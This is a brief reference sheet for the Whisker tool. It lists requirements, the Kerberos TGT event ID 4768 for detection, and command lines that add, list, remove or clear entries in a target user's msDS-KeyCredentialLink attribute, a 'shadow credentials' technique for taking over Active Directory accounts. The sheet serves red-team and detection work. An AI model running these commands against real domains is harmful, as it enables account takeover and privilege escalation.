### Source
https://github.com/eladshamir/Whisker  

### Requirements
```
Windows Server 2016 domain controller
digitale certificate for Server Authentication installed on domain controller
```

### Windows Security Log Event IDs
```
Kerberos authentication(4768) TGT requested 
```

### Generate public-private key pair, add credential to the target object and print rubeus asgtgt command
```
Whisker.exe add /target:<user>
```

### List entries of msDS-KeyCredentialLink attribute
```
Whisker.exe list /target:<user>
```

### Remove key credential by a DeviceID GUID
```
Whisker.exe remove /target:<user> /deviceid:<id>
```

### Remove all values from msDS-KeyCredentialLink attribute
```
Whisker.exe clear /target:<user>
```

